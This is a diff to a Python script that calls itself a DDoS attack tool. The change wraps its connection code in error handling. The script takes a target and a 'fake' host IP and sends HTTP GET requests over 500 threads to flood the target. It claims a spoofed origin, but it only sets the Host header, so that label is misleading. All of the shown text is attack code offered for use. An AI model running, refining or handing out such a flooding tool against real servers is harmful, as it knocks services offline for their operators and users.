@@ -25,11 +25,15 @@ fake_ip = input("Enter HOST IP: ")
 
 # Function to run the attack
 def attack():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((target, port))
-    s.sendto(f"GET / HTTP/1.1\r\nHost: {fake_ip}\r\n\r\n".encode(), (target, port))
-    print(f"[*] DDoS Attack sent to {target}:{port} originating from {fake_ip}")
-    s.close()
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(f"GET / HTTP/1.1\r\nHost: {fake_ip}\r\n\r\n".encode(), (target, port))
+        print(f"[*] DDoS Attack to {target}:{port} originating from {fake_ip}")
+    except socket.error:
+        print(f"[!] Connection to {target}:{port} refused")
+    finally:
+        s.close()
 
 # Start 500 threads to run the attack
 for i in range(500):
